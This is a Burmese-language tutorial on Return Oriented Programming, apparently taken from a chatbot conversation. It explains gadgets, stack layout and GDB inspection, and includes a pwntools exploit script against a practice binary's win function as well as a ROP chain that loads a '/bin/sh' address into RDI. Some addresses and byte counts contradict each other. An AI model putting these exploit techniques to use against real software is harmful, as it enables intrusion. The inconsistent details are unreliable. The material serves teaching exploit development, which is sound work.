
# Return Oriented Programming (ROP) အခြေခံရှင်းလင်းချက်

## ROP ဆိုတာဘာလဲ?
ROP ဟာ memory corruption vulnerability တွေကိုအသုံးချတဲ့ technique တစ်ခုပါ။ Hacker တွေက program ရဲ့ memory ထဲမှာရှိပြီးသား code တွေကိုပဲသုံးပြီး malicious operation တွေလုပ်ဆောင်တာဖြစ်ပါတယ်။

## ဘာကြောင့် ROP ကိုသုံးကြတာလဲ?

- **DEP/NX Bit** ကိုကျော်လွှားဖို့
- **Code Injection** မလုပ်ဘဲ attack လုပ်ဖို့
- Existing code တွေကိုပဲ reuse လုပ်တာမို့ ပိုခက်ခဲတဲ့ detection

## ROP အလုပ်လုပ်ပုံ

### 1. **Gadgets** - ROP ရဲ့ အခြေခံအစိတ်အပိုင်း
Gadget ဆိုတာ program memory ထဲမှာရှိပြီးသား instruction sequence လေးတွေပါ။

**Gadget တစ်ခုရဲ့ ပုံစံ:**
```asm
pop eax        ; register ထဲ value ထည့်
ret            ; return instruction
```

### 2. **Stack-based Control**
Normal program:
```
Call Function → Execute → Return
```

ROP chain:
```
Return Address 1 → Gadget 1 → Return Address 2 → Gadget 2 → ...
```

## ရိုးရိုးရှင်းရှင်း ဥပမာ

### ပုံမှန် Buffer Overflow:
```c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // No bounds checking!
}
```

### ROP Attack Steps:

**Step 1:** Buffer ကိုဖြည့်ပြီး return address ကိုချ overwrite လုပ်မယ်
```
[AAAA...AAAA][New Return Address][More Data...]
```

**Step 2:** Return address ကို gadget တစ်ခုရဲ့ address ထားမယ်
```
[Buffer Fill][Gadget1 Address][Gadget1 Parameter][Gadget2 Address]...
```

**Step 3:** Gadget တွေကိုဆက်စပ်အသုံးချ
```
Gadget 1: pop eax; ret        - System call number ထည့်
Gadget 2: pop ebx; ret        - Argument ထည့်  
Gadget 3: int 0x80; ret       - System call invoke
```

## ROP Chain Example ရှင်းလင်းချက်

Memory ထဲမှာ ဒီလို gadgets တွေရှိတယ်ဆိုပါစို့:
```
0x080485a0: pop eax; ret
0x080485b0: pop ebx; ret  
0x080485c0: int 0x80; ret
```

ROP Chain ဆောက်မယ်:
```
[Buffer Overflow]
[0x080485a0]  // Gadget 1 - pop eax
[0x0b]        // execve system call number
[0x080485b0]  // Gadget 2 - pop ebx  
["/bin/sh" address] // Command string
[0x080485c0]  // Gadget 3 - int 0x80 (system call)
```

## ROP ကာကွယ်နည်းများ

1. **ASLR** - Address Space Layout Randomization
2. **Stack Canaries** - Stack corruption detection  
3. **Control Flow Integrity** - Program flow monitoring
4. **Compiler Protection** - Security features enabled

## Beginner အတွက် အရေးကြီးအချက်များ

- ROP က memory ထဲက existing code တွေကိုပဲသုံးတယ်
- Gadget တွေကို "return" instruction နဲ့ဆုံးရမယ်
- Stack ပေါ်မှာ chain ဆက်ပြီး execution flow ကိုထိန်းချုပ်တယ်
- ရှုပ်ထွေးပေမယ့် powerful technique တစ်ခုပါ

ဒီ technique ကို နားလည်ဖို့ assembly language နဲ့ memory layout အကြောင်းသိထားဖို့လိုပါတယ်။

# ROPgadget Results ကိုရှင်းပြခြင်း

## ROPgadget ဆိုတာဘာလဲ?
ROPgadget က binary ထဲက instruction sequences (gadgets) တွေကိုရှာပေးတဲ့ tool ပါ။

## သင့်ရဲ့ Output ကိုခွဲခြမ်းကြည့်မယ်

### 1. **RDI-related Gadgets**
```
0x0000000000401136 : pop rdi ; ret
```
**ဒီ gadget ကအရေးကြီးဆုံးပါ!**
- `pop rdi` - rdi register ထဲကို stack ကနေ value တစ်ခုယူထည့်မယ်
- `ret` - return ပြန်ခေါ်မယ်

**ဘာကြောင့်အသုံးဝင်လဲ?**
- x64 calling convention မှာ **first argument** က rdi register ထဲမှာထည့်ရတယ်
- Function call ခေါ်ဖို့အတွက်လိုအပ်တယ်

### 2. **RSI-related Gadgets**
```
0x000000000040113b : pop rsi ; ret
```
**ဒါကဒုတိယအရေးကြီးဆုံး**
- `pop rsi` - rsi register ထဲကို value ထည့်မယ်
- `ret` - return ပြန်ခေါ်မယ်

**အသုံးဝင်ပုံ:**
- x64 calling convention မှာ **second argument** က rsi register ထဲမှာထည့်ရတယ်

## Win Function ကိုကြည့်မယ်

```asm
0x000000000040115d <+29>:    cmp DWORD PTR [rbp-0x4], 0xdeadbeef
0x0000000000401166 <+38>:    cmp DWORD PTR [rbp-0x8], 0xc0debeef
```

**Win function မှာ:**
- **First parameter (rdi)** က `0xdeadbeef` ဖြစ်ရမယ်
- **Second parameter (rsi)** က `0xc0debeef` ဖြစ်ရမယ်

## ROP Chain ဆောက်နည်း

### Required Gadgets:
```python
pop_rdi = 0x401136  # pop rdi ; ret
pop_rsi = 0x40113b  # pop rsi ; ret  
win_addr = 0x401140  # win function address
```

### ROP Chain Structure:
```
[BUFER FILL: 64 bytes]
[pop_rdi gadget]      # rdi register ကိုပြင်ဆင်မယ်
[0xdeadbeef]          # first argument value
[pop_rsi gadget]      # rsi register ကိုပြင်ဆင်မယ်  
[0xc0debeef]          # second argument value
[win_addr]            # win function ကိုခေါ်မယ်
```

## Practical Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Addresses from your analysis
pop_rdi = 0x401136    # pop rdi ; ret
pop_rsi = 0x40113b    # pop rsi ; ret
win_addr = 0x401140   # win function

# Setup
p = process('./level3')

# Buffer size from unsafe function: sub rsp, 0x40 (64 bytes)
# But we need to include saved RBP (8 bytes)
offset = 64 + 8       # buffer + saved rbp

# Build ROP chain
payload = b"A" * offset
payload += p64(pop_rdi)        # Set first argument
payload += p64(0xdeadbeef)     # value for rdi
payload += p64(pop_rsi)        # Set second argument  
payload += p64(0xc0debeef)     # value for rsi
payload += p64(win_addr)       # Call win function

# Send exploit
p.sendline(payload)
p.interactive()
```

## Stack Layout ပုံ

```
Before overflow:
[Buffer: 64 bytes][Saved RBP: 8 bytes][Return Address: 8 bytes]

After overflow:
[AAAA...AAAA (64)][AAAAAAA (8)][pop_rdi][0xdeadbeef][pop_rsi][0xc0debeef][win_addr]
```

## အဆင့်ဆင့်ရှင်းလင်းချက်

1. **Buffer overflow** ဖြစ်တဲ့အခါ return address ကို overwrite လုပ်မယ်
2. **Return address** ကို `pop_rdi` gadget address ထားမယ်
3. Program က `pop_rdi` ကိုခေါ်၊ stack ကနေ `0xdeadbeef` ကို rdi ထဲထည့်
4. `ret` ကနေ နောက် address (`pop_rsi`) ကိုခေါ်
5. `pop_rsi` က `0xc0debeef` ကို rsi ထဲထည့်
6. နောက်ဆုံး `win_addr` ကိုခေါ်ပြီး win function execute လုပ်မယ်

## ဘာကြောင့် အဲဒီ Gadgets တွေကိုရှာနေတာလဲ?

**x64 Calling Convention:**
- **1st argument** → RDI register
- **2nd argument** → RSI register  
- **3rd argument** → RDX register
- **4th argument** → RCX register

Win function မှာ parameter ၂ခုလိုတဲ့အတွက် `pop rdi` နဲ့ `pop rsi` gadgets တွေလိုအပ်တာပါ။

**ဒီ exploit ကိုရေးဖို့ သင်သိထားရမှာက:**
- Buffer size ဘယ်လောက်လဲ
- Win function address ဘယ်မှာလဲ  
- Arguments တွေကိုဘယ် registers ထဲထည့်ရမလဲ
- ဘယ် gadgets တွေလိုအပ်လဲ

# GDB မှာ Instructions တွေကို ဘယ်လိုကြည့်မလဲ

## ROPgadget ပြထားတဲ့ Address တွေကို GDB မှာကြည့်နည်း

### 1. **Disassemble at Specific Address**
```bash
gdb ./level3
```

**GDB commands:**
```
# Disassemble at pop rdi gadget address
(gdb) x/5i 0x0000000000401136

# Disassemble at pop rsi gadget address  
(gdb) x/5i 0x000000000040113b

# Disassemble a range to see context
(gdb) x/10i 0x0000000000401130
```

### 2. **ငါတို့ရဲ့ Gadgets တွေကို GDB မှာတိုက်ရိုက်ကြည့်ကြမယ်**

**pop rdi gadget:**
```
(gdb) x/5i 0x401136
0x401136:	pop    %rdi
0x401137:	ret    
```

**pop rsi gadget:**
```
(gdb) x/5i 0x40113b  
0x40113b:	pop    %rsi
0x40113c:	ret
```

### 3. **ဒီ Instructions တွေ Binary ထဲမှာရှိတယ်ဆိုတာ ဘယ်လိုသိခဲ့တာလဲ?**

**objdump နဲ့ကြည့်မယ်:**
```bash
objdump -d level3 | grep -A 5 -B 5 "401136"
```

**ဒါမှမဟုတ် full disassembly ကြည့်မယ်:**
```bash
objdump -d level3 > disassembly.txt
```

ပြီးရင် disassembly.txt ထဲမှာ `401136` ရှာကြည့်ပါ။

## GDB မှာ ဘယ်လိုရှာကြည့်မလဲ

### Method 1: **Examine Memory as Instructions**
```
(gdb) x/20i 0x401130
```

**Output က ဒီလိုမျိုးပြမယ်:**
```
0x401130:	some instruction
0x401131:	some instruction  
0x401132:	some instruction
0x401133:	some instruction
0x401134:	some instruction
0x401135:	mov    bl,BYTE PTR [rdi-0x3d]
0x401138:	nop
0x401139:	ud2    
0x40113a:	pop    rsi
0x40113b:	ret
0x40113c:	some instruction
0x40113d:	some instruction
0x40113e:	some instruction  
0x40113f:	some instruction
0x401140:	push   rbp           # This is win function!
```

### Method 2: **Find All "ret" Instructions**
```
(gdb) info address ret
# ဒါမှမဟုတ်
(gdb) find 0x400000, 0x402000, 0xc3  # Find ret instructions (0xc3)
```

### Method 3: **Search for Specific Bytes**
```
(gdb) find 0x400000, 0x402000, 0x5f  # Find pop rdi (0x5f)
(gdb) find 0x400000, 0x402000, 0x5e  # Find pop rsi (0x5e)
```

## ဘာကြောင့် မင်းမသိခဲ့တာလဲ?

### Common Beginner Mistakes:

1. **GDB commands ကိုမသိခြင်း**
   - `x/i` (examine as instruction) ကိုမသုံးတတ်ခြင်း
   - `disas` က function ပဲ disassemble လုပ်တယ်၊ address နဲ့မလုပ်ဘူး

2. **Memory Addresses ကိုနားမလည်ခြင်း**
   - Binary ထဲမှာ code တွေက specific addresses တွေမှာရှိတယ်
   - ROPgadget ကဒီ addresses တွေကိုပဲပြတာ

3. **Assembly ကိုမကျွမ်းကျင်ခြင်း**
   - `pop rdi` = `0x5f` 
   - `ret` = `0xc3`
   - ဒီ bytes sequence တွေက binary ထဲမှာရှိတယ်

## Practical Demo in GDB

```bash
gdb ./level3
```

**GDB commands တွေအလုပ်လုပ်ပုံ:**
```
(gdb) break main
(gdb) run
(gdb) x/10i 0x401136
```

**Expected output:**
```
0x401136:	pop    %rdi
0x401137:	ret    
0x401138:	nop
0x401139:	ud2    
0x40113a:	pop    %rsi
0x40113b:	ret
0x40113c:	add    %al,(%rax)
0x40113e:	add    %al,(%rax)
0x401140:	push   %rbp
0x401141:	mov    %rsp,%rbp
```

## ဘယ်လိုလေ့လာသင်ယူမလဲ?

### 1. **GDB Basics ကိုအရင်ဆုံးလေ့လာပါ**
```bash
gdb -q ./level3
(gdb) help x    # Examine command help
(gdb) help disas # Disassemble command help
```

### 2. **Manual ROPgadget Search**
```bash
# Find "pop rdi" manually in binary
objdump -d level3 | grep "pop.*%rdi"
```

### 3. **Write Simple Test Programs**
```c
// test.c
void test() {
    asm("pop %rdi; ret");
}
```
Compile and check with objdump!

### 4. **Practice These Commands Daily**
```
(gdb) x/i ADDRESS    # Examine instruction at address
(gdb) x/10i ADDRESS  # Examine 10 instructions
(gdb) disas FUNCTION # Disassemble function
(gdb) info functions # List all functions
```


---

## RET equals to  RIP = [RSP] , POP RIP

---

အင်း! ကျွန်တော်တို့ `pop rdi; ret` နဲ့ `pop rsi; ret` gadgets တွေပဲသုံးပြီး အကုန်လုံးကို ပြန်ရှင်းပြပါမယ်။

## **Program Setup**

**Memory Layout:**
```
0x400000 - 0x401000: Code Section
0x400500: main function
0x400530: vulnerable_function
0x400600: pop rdi; ret gadget
0x400610: pop rsi; ret gadget  
0x400900: "/bin/sh" string
```

---

## **Step 1: Normal Program Start**

**OS calls main():**
```
RIP = 0x400500 (main)
RSP = 0x7fffffffe000
```

**Stack:**
```
0x7fffffffdff8: 0x7ffff7a03c87    ← OS return address (RSP here)
```

---

## **Step 2: Main calls vulnerable_function**

**After main prologue:**
```
RBP = 0x7fffffffdff8
RSP = 0x7fffffffdfe8
```

**Before CALL:**
```assembly
0x400508: call vulnerable_function
```

**After CALL:**
```
RIP = 0x400530 (vulnerable_function)
RSP = 0x7fffffffdfe0
```

**Stack:**
```
0x7fffffffdfe0: 0x0000000000400511    ← Return to main+17 (RSP here)
0x7fffffffdfe8: [main's local vars]
0x7fffffffdff8: 0x0000000000000000    ← main's saved RBP
```

---

## **Step 3: vulnerable_function Stack Frame**

**After prologue:**
```assembly
0x400530: push rbp
0x400531: mov rbp, rsp  
0x400534: sub rsp, 0x20
```

**Stack Frame:**
```
0x7fffffffdfb8: [buffer[0-7]]         ← RSP here
0x7fffffffdfc0: [buffer[8-15]]        ← buffer[16] ends
0x7fffffffdfc8: [padding]             ← 8 bytes
0x7fffffffdfd0: [padding]             ← 8 bytes  
0x7fffffffdfd8: 0x00007fffffffdff8    ← Saved RBP (RBP here)
0x7fffffffdfe0: 0x0000000000400511    ← Return address to main
```

---

## **Step 4: Buffer Overflow Attack**

**Malicious Input (56 bytes):**
```
Bytes 0-15:  "AAAAAAAAAAAAAAAA"    (fill buffer)
Bytes 16-31: "BBBBBBBBBBBBBBBB"    (overwrite padding)
Bytes 32-39: "CCCCCCCC"            (overwrite saved RBP)  
Bytes 40-47: 0x0000000000400600    (pop rdi; ret gadget)
Bytes 48-55: 0x0000000000400900    (value for RDI - "/bin/sh")
Bytes 56-63: 0x0000000000400610    (pop rsi; ret gadget) 
Bytes 64-71: 0x0000000000000000    (value for RSI - NULL)
```

**After strcpy() - Stack Corrupted:**
```
0x7fffffffdfb8: 0x4141414141414141    ← buffer[0-7]
0x7fffffffdfc0: 0x4141414141414141    ← buffer[8-15]  
0x7fffffffdfc8: 0x4242424242424242    ← padding
0x7fffffffdfd0: 0x4242424242424242    ← padding
0x7fffffffdfd8: 0x4343434343434343    ← saved RBP overwritten
0x7fffffffdfe0: 0x0000000000400600    ← return address = pop rdi; ret (RSP after leave)
0x7fffffffdfe8: 0x0000000000400900    ← value for RDI = "/bin/sh" address
0x7fffffffdff0: 0x0000000000400610    ← pop rsi; ret gadget
0x7fffffffdff8: 0x0000000000000000    ← value for RSI = NULL
0x7fffffffE000: 0x7ffff7a03c87        ← OS return
```

---

## **Step 5: ROP Chain Execution**

### **vulnerable_function returns**
```assembly
0x400539: leave
0x40053a: ret
```

**After `LEAVE` (`MOV RSP, RBP`):**
```
RSP = 0x7fffffffdfd8
```

**After `LEAVE` (`POP RBP`):**
```
RBP = 0x4343434343434343
RSP = 0x7fffffffdfe0
```

**After `RET`:**
```
RIP = 0x400600 (pop rdi; ret gadget)
RSP = 0x7fffffffdfe8
```

---

## **Step 6: Gadget 1 - `pop rdi; ret` at 0x400600**

### **Before Execution:**
```
RIP = 0x400600
RSP = 0x7fffffffdfe8
RDI = 0x0000000000000000 (previous value)
```

**Stack:**
```
0x7fffffffdfe8: 0x0000000000400900    ← RSP points here (value for RDI)
0x7fffffffdff0: 0x0000000000400610    ← next gadget (pop rsi; ret)
0x7fffffffdff8: 0x0000000000000000    ← value for RSI
```

### **Execute `pop rdi`:**
```assembly
0x400600: pop rdi    ; RDI = [RSP], RSP = RSP + 8
```

**During execution:**
- Read from `RSP (0x7fffffffdfe8)` = `0x400900`
- Store `0x400900` into RDI
- RSP = RSP + 8 = `0x7fffffffdff0`

**After `pop rdi`:**
```
RDI = 0x0000000000400900  ← "/bin/sh" address
RSP = 0x7fffffffdff0      ← Increased by 8
RIP = 0x400601           ← Ready for ret instruction
```

**Stack After:**
```
0x7fffffffdfe8: 0x0000000000400900    ← Already consumed
0x7fffffffdff0: 0x0000000000400610    ← RSP points here (next gadget)
0x7fffffffdff8: 0x0000000000000000    ← value for RSI
```

### **Execute `ret`:**
```assembly
0x400601: ret    ; RIP = [RSP], RSP = RSP + 8
```

**During execution:**
- Read from `RSP (0x7fffffffdff0)` = `0x400610`
- Jump to `0x400610` (pop rsi; ret gadget)
- RSP = RSP + 8 = `0x7fffffffdff8`

**After `ret`:**
```
RIP = 0x0000000000400610  ← pop rsi; ret gadget
RSP = 0x7fffffffdff8      ← Increased by 8
RDI = 0x0000000000400900  ← Unchanged (still "/bin/sh")
```

**Stack After:**
```
0x7fffffffdff0: 0x0000000000400610    ← Already consumed
0x7fffffffdff8: 0x0000000000000000    ← RSP points here (value for RSI)
0x7fffffffE000: 0x7ffff7a03c87        ← OS return
```

---

## **Step 7: Gadget 2 - `pop rsi; ret` at 0x400610**

### **Before Execution:**
```
RIP = 0x400610
RSP = 0x7fffffffdff8
RSI = 0x0000000000000000 (previous value)
RDI = 0x0000000000400900 (still from previous gadget)
```

**Stack:**
```
0x7fffffffdff8: 0x0000000000000000    ← RSP points here (value for RSI)
0x7fffffffE000: 0x7ffff7a03c87        ← Would be next, but we'll stop here
```

### **Execute `pop rsi`:**
```assembly
0x400610: pop rsi    ; RSI = [RSP], RSP = RSP + 8
```

**During execution:**
- Read from `RSP (0x7fffffffdff8)` = `0x0000000000000000`
- Store `0x0000000000000000` into RSI
- RSP = RSP + 8 = `0x7fffffffE000`

**After `pop rsi`:**
```
RSI = 0x0000000000000000  ← NULL value
RSP = 0x7fffffffE000      ← Increased by 8
RIP = 0x400611           ← Ready for ret instruction
RDI = 0x0000000000400900  ← Unchanged
```

**Stack After:**
```
0x7fffffffdff8: 0x0000000000000000    ← Already consumed
0x7fffffffE000: 0x7ffff7a03c87        ← RSP points here (OS return)
```

### **Execute `ret`:**
```assembly
0x400611: ret    ; RIP = [RSP], RSP = RSP + 8
```

**During execution:**
- Read from `RSP (0x7fffffffE000)` = `0x7ffff7a03c87`
- Jump to `0x7ffff7a03c87` (OS return address)
- RSP = RSP + 8 = `0x7fffffffE008`

**Final State:**
```
RIP = 0x7ffff7a03c87     ← Back to OS
RSP = 0x7fffffffE008     ← Clean stack
RDI = 0x0000000000400900 ← "/bin/sh" address  
RSI = 0x0000000000000000 ← NULL value
```

---

## **Complete ROP Chain Summary**

**Stack Payload Layout:**
```
Offset  Address          Content              Purpose
+0x00   0x7fffffffdfb8: 0x4141414141414141    buffer[0-7]
+0x08   0x7fffffffdfc0: 0x4141414141414141    buffer[8-15]
+0x10   0x7fffffffdfc8: 0x4242424242424242    padding[0-7]
+0x18   0x7fffffffdfd0: 0x4242424242424242    padding[8-15]
+0x20   0x7fffffffdfd8: 0x4343434343434343    saved RBP
+0x28   0x7fffffffdfe0: 0x0000000000400600    ← Gadget 1: pop rdi; ret
+0x30   0x7fffffffdfe8: 0x0000000000400900    ← Value for RDI: "/bin/sh"
+0x38   0x7fffffffdff0: 0x0000000000400610    ← Gadget 2: pop rsi; ret  
+0x40   0x7fffffffdff8: 0x0000000000000000    ← Value for RSI: NULL
```

**Execution Flow:**
1. **Gadget 1:** `pop rdi; ret` 
   - `pop rdi`: RDI = `0x400900`, RSP = `0x7fffffffdff0`
   - `ret`: RIP = `0x400610`, RSP = `0x7fffffffdff8`

2. **Gadget 2:** `pop rsi; ret`
   - `pop rsi`: RSI = `0x00000000`, RSP = `0x7fffffffE000`  
   - `ret`: RIP = `0x7ffff7a03c87`, RSP = `0x7fffffffE008`

**Final Register State:**
- RDI = `0x400900` ("/bin/sh" address)
- RSI = `0x00000000` (NULL)
- Ready for system call (though we'd need more gadgets for execve)

**ဒီလိုနည်းနဲ့ `pop rdi; ret` နဲ့ `pop rsi; ret` gadgets တွေက stack ကနေ value တွေယူပြီး register တွေထဲထည့်၊ ပြီးရင် နောက် gadget ဆီဆက်သွားတာပါ!**

https://chat.deepseek.com/share/ddzfwuld069dhg8023

---
‌



